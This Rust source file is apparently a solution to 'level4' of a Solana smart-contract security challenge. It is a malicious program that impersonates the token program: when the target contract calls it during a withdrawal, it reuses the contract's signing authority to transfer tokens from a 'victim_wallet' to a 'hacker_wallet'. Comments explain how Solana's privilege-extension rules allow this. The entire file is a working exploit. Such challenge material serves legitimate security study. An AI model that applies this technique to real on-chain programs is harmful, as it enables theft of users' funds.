use solana_program::{
    account_info::AccountInfo, entrypoint, entrypoint::ProgramResult, program::invoke,
    pubkey::Pubkey,
};

entrypoint!(process_instruction);

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    match spl_token::instruction::TokenInstruction::unpack(instruction_data).unwrap() {
        spl_token::instruction::TokenInstruction::TransferChecked { amount, .. } => {
            // call received from the level4 contract with these accounts
            let hacker_wallet = &accounts[0]; // level4.withdraw's wallet_info
            let spl_token = &accounts[1]; // level4.withdraw's mint
            let victim_wallet = &accounts[2]; // level4.withdraw's destination
            let level4_authority = &accounts[3]; // level4.withdraw's authority
            invoke(
                /* "Note that invoke requires the caller to pass all the accounts required by the
                instruction being invoked. This means that both the executable account
                (the ones that matches the instruction's program id) and the accounts passed to the
                instruction processor." https://docs.solana.com/developing/programming-model/calling-between-programs
                tx creator must include real SPL_TOKEN in the input instruction
                */

                // difference Transfer and TransferChecked is irrelevant here https://github.com/solana-labs/solana-program-library/blob/fc0d6a2db79bd6499f04b9be7ead0c400283845e/token/program/src/instruction.rs#L250
                // https://docs.rs/spl-token/3.2.0/spl_token/instruction/fn.transfer.html

                /* "The runtime uses the privileges granted to the caller program to determine
                    what privileges can be extended to the callee. Privileges in this context refer to signers
                 and writable accounts. For example, if the instruction the caller is processing contains
                  a signer or writable account, then the caller can invoke an instruction that also contains
                   that signer and/or writable account."
                   level4 had to use invoke_signed as the PDE was not on input instruction's signer list
                   but now it's a signer on our parent's instruction and this suffices?
                */
                &spl_token::instruction::transfer(
                    spl_token.key,        // token_program_id: &Pubkey,
                    victim_wallet.key, // source_pubkey: &Pubkey,
                    hacker_wallet.key,      // destination_pubkey: &Pubkey,
                    level4_authority.key,   // authority_pubkey: &Pubkey,
                    &[],             // signer_pubkeys: &[&Pubkey],
                    amount,          // amount: u64
                )
                .unwrap(),
                &[
                    // spl_token.clone(), // invoked program not actually needed
                    hacker_wallet.clone(),
                    victim_wallet.clone(),
                    level4_authority.clone(),
                ],
            )
        }
        _ => {
            panic!("wrong ix")
        }
    }
}
